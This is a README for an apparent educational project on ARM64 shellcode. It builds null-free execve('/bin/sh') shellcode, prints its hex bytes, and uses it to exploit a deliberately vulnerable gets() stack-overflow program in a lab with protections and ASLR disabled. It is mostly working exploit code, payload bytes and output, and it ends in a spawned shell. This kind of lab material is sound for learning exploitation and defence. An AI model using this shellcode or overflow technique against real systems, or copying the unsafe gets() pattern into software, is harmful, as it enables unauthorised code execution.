# arm64_reverse_shellcode

arm64 assembly program to map arm64 reverse shell code into memory and execute code

## This will only work on target arm64 device. 

Source code for mapping revese shell code into memory and executing the mapped shell code.
The arm64 code was tested on a Raspberry Pi running Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1062-raspi2 aarch64).

## License

Please see the [LICENSE](LICENSE) file for the exact details.

## sc.c
## sc.s

## Building 

This project will go into creating shell code for exploitation.  This program will replace the shell with a new program execution shell.  The source code is shown below.
       
    #include <stdlib.h>
    int main()
    {
        execve("/bin/sh", NULL, NULL);
    }

The shell code is build as shown below.
       
    $ cmake -DCMAKE_TOOLCHAIN_FILE=~/toolchain-aarch64-linux-gnu.cmake .. && make
    $ scp sc ubuntu@169.254.251.49:/home/ubuntu/download
    Shell code example execution is shown below.
    
    ubuntu@ubuntu:~/download$ ./sc
    $ exit
    ubuntu@ubuntu:~/download$ sudo ./sc
    # exit
    ubuntu@ubuntu:~/download$

This shell code program can now be transformed into arm assembler
       
    $ make sc.c.s
    Compiling C source to assembly CMakeFiles/sc.dir/sc.c.s
    /home/max/reverse/shell-code/sc.c: In function ‘main’:
    /home/max/reverse/shell-code/sc.c:5:2: warning: implicit declaration of function ‘execve’ [-Wimplicit-function-declaration]
        execve("/bin/sh", NULL, NULL);

Shell code assembly output is displayed below.  However, in order to execute this code the call to execve will be replaced with a system call.  Additionally, all the  null bytes will be removed from the code to make it loadable as shell-code.  But first this code will be modified and assembled using the arm assembler.
       
    $ cd CMakeFiles/sc.dir
    $ cat cat sc.c.s
    .arch armv8-a
    .file	"sc.c"
    .text
    .section	.rodata
    .align	3
    .LC0:
    .string	"/bin/sh"
    .text
    .align	2
    .global	main
    .type	main, %function
    main:
    stp	x29, x30, [sp, -16]!
    add	x29, sp, 0
    adrp	x0, .LC0
    add	x0, x0, :lo12:.LC0
    mov	x2, 0
    mov	x1, 0
    bl	execve
    mov	w0, 0
    ldp	x29, x30, [sp], 16
    ret
    .size	main, .-main
    .ident	"GCC: (Ubuntu/Linaro 7.5.0-3ubuntu1~18.04) 7.5.0"
    .section	.note.GNU-stack,"",@progbits

Move the sc.c.s to a new directory and build and test the program.  This file will be build with the arm64 assembler and will then be statically linked using the gcc.  The steps are outlined, below:
       
    $ cd shell-code-asm
    $ aarch64-linux-gnu-as sc.c.s -o sc.o
    $ aarch64-linux-gnu-gcc -static -o sc sc.o
    $ scp sc ubuntu@169.254.251.49:/home/ubuntu/download
    In the target terminal, below
    $ ./sc
    $ exit

Now the shell code assembler source code has been modified to directly perform the system call by substituting the execve with the linux system call number.  Additionally, the null bytes have been removed from the code.  This will allow the shell code to be used to exploit memory corruption vulnerabilities.

    $ cd shell-code-asm
    $ cat sc.s
    .section .text
    .global _start
    _start:
        // execve("/bin/sh", NULL, NULL)
        mov  x1, #0x622F            // x1 = 0x000000000000622F ("b/")
        movk x1, #0x6E69, lsl #16   // x1 = 0x000000006E69622F ("nib/")
        movk x1, #0x732F, lsl #32   // x1 = 0x0000732F6E69622F ("s/nib/")
        movk x1, #0x68, lsl #48     // x1 = 0x0068732F6E69622F ("hs/nib/")
        str  x1, [sp, #-8]!         // push x1
        mov  x1, xzr                // args[1] = NULL
        mov  x2, xzr                // args[2] = NULL
        add  x0, sp, x1             // args[0] = pointer to "/bin/sh\0"
        mov  x8, #221               // Systemcall Number = 221 (execve)
        svc  #0x1337                // Invoke Systemcall

Now build and run the shell code assembler source code on the target system.
       
    $ aarch64-linux-gnu-as sc.s -o sc.o
    $ aarch64-linux-gnu-ld sc.o -o sc
    $ scp sc ubuntu@169.254.251.49:~/download/shell-code-asm
    On the Target run the sc program
    shell $ ./sc
    $ exit
    shell $

Next the shell code assembler source code from above is converted to an array that can be mapped into memory and invoked for exploitation.  

    $ aarch64-linux-gnu-objdump -d ./sc
    ./sc:     file format elf64-littleaarch64
    Disassembly of section .text:
    0000000000400078 <_start>:
    400078:	d28c45e1 	mov	x1, #0x622f                	// #25135
    40007c:	f2adcd21 	movk	x1, #0x6e69, lsl #16
    400080:	f2ce65e1 	movk	x1, #0x732f, lsl #32
    400084:	f2e00d01 	movk	x1, #0x68, lsl #48
    400088:	f81f8fe1 	str	x1, [sp, #-8]!
    40008c:	aa1f03e1 	mov	x1, xzr
    400090:	aa1f03e2 	mov	x2, xzr
    400094:	8b2163e0 	add	x0, sp, x1
    400098:	d2801ba8 	mov	x8, #0xdd                  	// #221
    40009c:	d40266e1 	svc	#0x1337

    $ aarch64-linux-gnu-objcopy -O binary sc sc.bin
    $ hexdump -v sc.bin
    0000000 45e1 d28c cd21 f2ad 65e1 f2ce 0d01 f2e0
    0000010 8fe1 f81f 03e1 aa1f 03e2 aa1f 63e0 8b21
    0000020 1ba8 d280 66e1 d402                    
    0000028

$ hexdump -v -e '"\\""x" 1/1 "%02x" ""' sc.bin && echo
\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4
$ hexdump -v -e ' 1/1 "%02x" ""' sc.bin && echo
e1458cd221cdadf2e165cef2010de0f2e18f1ff8e1031faae2031faae063218ba81b80d2e16602d4
$ hexdump -v -e ' 1/1 "%02x" ""' sc.bin > sc.hex
$ cat sc.hex
e1458cd221cdadf2e165cef2010de0f2e18f1ff8e1031faae2031faae063218ba81b80d2e16602d4       
## Testing Shell Code Exploition

This will build upon injecting shell code for exploitation.  Source code for the stack-overflow program is shown below.  If the user enters more characters than the buffer can handle the buffer overflows on the stack and the program is aborted.  The example below demonstrates a classic stack overflow.
       
    /*
    * stack-overflow-gets.c
    * 
    * Program to Overflow the Stack Buffer
    *
    */
    #include <stdio.h>
    void func()
    {
        char name[64];          // Input Buffer Limited to 64 bytes
        printf("%p\n", name);   // Print address of buffer.
        puts("What's your name?");
        gets(name);
        printf("Hello, %s!\n", name);
    }
    int main()
    {
    func();
            return 0;
    }

The stack-overflow code is build as shown below.
       
    $ cmake -DCMAKE_TOOLCHAIN_FILE=~/toolchain-aarch64-linux-gnu.cmake .. && make
    $ scp stack-overflow ubuntu@169.254.251.49:/home/ubuntu/download/stack-overflow
    Program stack-overflow execution is shown below.
    
    $ ./stack-overflow-gets 
    0xfffffffff3a8
    What's your name?
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
    *** stack smashing detected ***: <unknown> terminated
    Aborted

Stack smashing was detected, now it will be removed and executed again.  Also, the execute stack is enabled.

In the CmakeList.txt uncomment the following

    # set C flags
    set (CMAKE_C_FLAGS "-fno-stack-protector")
    # set linker flags
    set (CMAKE_EXE_LINKER_FLAGS "-z execstack")
    The stack-overflow code is build again as shown below.
    
    $ cmake -DCMAKE_TOOLCHAIN_FILE=~/toolchain-aarch64-linux-gnu.cmake .. && make
    $ scp stack-overflow-gets ubuntu@169.254.251.49:/home/ubuntu/stack-overflow
    Next, execute the program disabling ALSR, so the same address will appear on subsequent running of the program.  Program stack-overflow execution is shown below.  Note the stack smashing is disabled.
    
    $ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
    $./stack-overflow-gets 
    0xfffffffff3b0
    What's your name?
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
    Bus error

Now the shell code that was created in the previous chapter will be injected into the stack and executed.  
First, the address of the array is obtained which will be the return address from stack.  Next, the shell code is created followed by zero padding and finally the return address.
       
    $ a=`printf %016x 0xfffffffff350 | tac -rs..`
    $ echo $a
    50f3ffffffff
    $ cat sc.hex ; printf %064d 0 ; echo $a
    e1458cd221cdadf2e165cef2010de0f2e18f1ff8e1031faae2031faae063218ba81b80d2e16602d4000000000000000000000000000000000000000000000000000000000000000050f3ffffffff0000
    $ ( ( cat sc.hex ; printf %064d 0 ; echo $a ) | xxd -r -p ; cat ) > sc.bin
    ^C
    $ hexdump -v sc.bin 
    0000000 45e1 d28c cd21 f2ad 65e1 f2ce 0d01 f2e0
    0000010 8fe1 f81f 03e1 aa1f 03e2 aa1f 63e0 8b21
    0000020 1ba8 d280 66e1 d402 0000 0000 0000 0000
    0000030 0000 0000 0000 0000 0000 0000 0000 0000
    0000040 0000 0000 0000 0000 f350 ffff ffff 0000

The following will inject the shell code into the stack and execute the shell code upon exit from the exploited function.
       
    $ gdb ./stack-overflow-gets
    GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git
    Reading symbols from ./stack-overflow-gets...(no debugging symbols found)...done.
    (gdb) break main
    Breakpoint 1 at 0xa38
    (gdb) run < sc.bin
    Starting program: /home/ubuntu/download/stack-overflow/stack-overflow-gets < sc.bin
    breakpoint 1, 0x0000aaaaaaaaaa38 in main ()
    (gef)
               
Run the shell code by injecting it into the overflow stack.
       
    $ gdb ./stack-overflow-gets 
    GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git
    Copyright (C) 2018 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
    This is free software: you are free to change and redistribute it.
    Reading symbols from ./stack-overflow-gets...(no debugging symbols found)...done.
    (gdb) break main
    Breakpoint 1 at 0xac4
    (gdb) run < sc_gdb.bin
    Starting program: /home/ubuntu/download/stack-overflow/stack-overflow-gets < sc_gdb.bin
    Breakpoint 1, 0x0000aaaaaaaaaac4 in main ()
    (gdb) continue
    Continuing.
    0xfffffffff350
    What's your name?
    ����#��##��##��c!��#���f#�!
    process 6000 is executing new program: /bin/dash
    Error in re-setting breakpoint 1: Function "main" not defined.
    [Inferior 1 (process 6000) exited normally]

The shell code run, but does not complete execution
The above shows a successful execution of the shell code.  However, a new shell cannot be displayed using the debugger.  Stepping through the debugger just verifies the shell code execution.  Next, the program will be executed outside the debugger using strace to verify execution.  First run the program on the command line and note the new exploitation address without the debugger.
       
    $ ./stack-overflow-gets 
    0xfffffffff390
    What's your name?
    eee
    Hello, eee!
    Go through the steps shown above again the create a new sc.bin binary using this new exploitation address.  But this time use strace to display the system call performed during execution.
       
    $ strace ./stack-overflow-gets < sc.bin
    execve("./stack-overflow-gets", ["./stack-overflow-gets"], 0xfffffffff520 /* 21 vars */) = 0
    brk(NULL)                               = 0xaaaaaaabc000
    faccessat(AT_FDCWD, "/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
    faccessat(AT_FDCWD, "/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
    openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
    fstat(3, {st_mode=S_IFREG|0644, st_size=31512, ...}) = 0
    mmap(NULL, 31512, PROT_READ, MAP_PRIVATE, 3, 0) = 0xfffff7ff3000
    close(3)                                = 0
    faccessat(AT_FDCWD, "/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
    openat(AT_FDCWD, "/lib/aarch64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
    read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0\267\0\1\0\0\0 \10\2\0\0\0\0\0"..., 832) = 832
    fstat(3, {st_mode=S_IFREG|0755, st_size=1345176, ...}) = 0
    mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffff7ff1000
    mmap(NULL, 1413976, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xfffff7e77000
    mprotect(0xfffff7fb8000, 61440, PROT_NONE) = 0
    mmap(0xfffff7fc7000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x140000) = 0xfffff7fc7000
    mmap(0xfffff7fcd000, 13144, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xfffff7fcd000
    close(3)                                = 0
    mprotect(0xfffff7fc7000, 16384, PROT_READ) = 0
    mprotect(0xaaaaaaaba000, 4096, PROT_READ) = 0
    mprotect(0xfffff7ffd000, 4096, PROT_READ) = 0
    munmap(0xfffff7ff3000, 31512)           = 0
    fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
    brk(NULL)                               = 0xaaaaaaabc000
    brk(0xaaaaaaadd000)                     = 0xaaaaaaadd000
    write(1, "0xfffffffff390\n", 150xfffffffff390
    )        = 15
    write(1, "What's your name?\n", 18What's your name?
    )     = 18
    fstat(0, {st_mode=S_IFREG|0664, st_size=80, ...}) = 0
    read(0, "\341E\214\322!\315\255\362\341e\316\362\1\r\340\362\341\217\37\370\341\3\37\252\342\3\37\252\340c!\213"..., 4096) = 80
    read(0, "", 4096)                       = 0
    write(1, "Hello, \341E\214\322!\315\255\362\341e\316\362\1\r\340\362\341\217\37\370\341\3\37\252\3����#��##��##��c!��#���f#�!#
    ) = 49
    execve("/bin/sh", NULL, NULL)           = 0
    brk(NULL)                               = 0xaaaaaaad8000
    faccessat(AT_FDCWD, "/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
    faccessat(AT_FDCWD, "/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
    openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
    fstat(3, {st_mode=S_IFREG|0644, st_size=31512, ...}) = 0
    mmap(NULL, 31512, PROT_READ, MAP_PRIVATE, 3, 0) = 0xfffff7ff3000
    close(3)                                = 0
    faccessat(AT_FDCWD, "/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
    openat(AT_FDCWD, "/lib/aarch64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
    read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0\267\0\1\0\0\0 \10\2\0\0\0\0\0"..., 832) = 832
    fstat(3, {st_mode=S_IFREG|0755, st_size=1345176, ...}) = 0
    mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffff7ff1000
    mmap(NULL, 1413976, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xfffff7e77000
    mprotect(0xfffff7fb8000, 61440, PROT_NONE) = 0
    mmap(0xfffff7fc7000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x140000) = 0xfffff7fc7000
    mmap(0xfffff7fcd000, 13144, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xfffff7fcd000
    close(3)                                = 0
    mprotect(0xfffff7fc7000, 16384, PROT_READ) = 0
    mprotect(0xaaaaaaad3000, 8192, PROT_READ) = 0
    mprotect(0xfffff7ffd000, 4096, PROT_READ) = 0
    munmap(0xfffff7ff3000, 31512)           = 0
    getuid()                                = 1000
    getgid()                                = 1000
    getpid()                                = 12739
    rt_sigaction(SIGCHLD, {sa_handler=0xaaaaaaabe040, sa_mask=~[RTMIN RT_1], sa_flags=0}, NULL, 8) = 0
    geteuid()                               = 1000
    brk(NULL)                               = 0xaaaaaaad8000
    brk(0xaaaaaaaf9000)                     = 0xaaaaaaaf9000
    getppid()                               = 12737
    getcwd("/home/ubuntu/download/stack-overflow", 4096) = 37
    ioctl(0, TCGETS, 0xfffffffffae0)        = -1 ENOTTY (Inappropriate ioctl for device)
    geteuid()                               = 1000
    getegid()                               = 1000
    rt_sigaction(SIGINT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
    rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=0}, NULL, 8) = 0
    rt_sigaction(SIGQUIT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
    rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=0}, NULL, 8) = 0
    rt_sigaction(SIGTERM, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
    rt_sigaction(SIGTERM, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=0}, NULL, 8) = 0
    read(0, "", 8192)                       = 0
    exit_group(0)                           = ?
    +++ exited with 0 +++
    
Note that execve /bin/sh is executed as indicated by the strace log.  Now, the program can be executed to create a command execution shell.  Note that no prompt is displayed, however a shell has been exposed to the user.  This std input is made possible by the cat command and is not using the terminal (/dev/tty).
       
    $ (cat sc.bin; cat) | ./stack-overflow-gets
    0xfffffffff390
    What's your name?
    ����#��##��##��c!��#���f#�!
    id
    uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(lxd),111(netdev)
    
    whoami
    ubuntu
    exit
    $ 

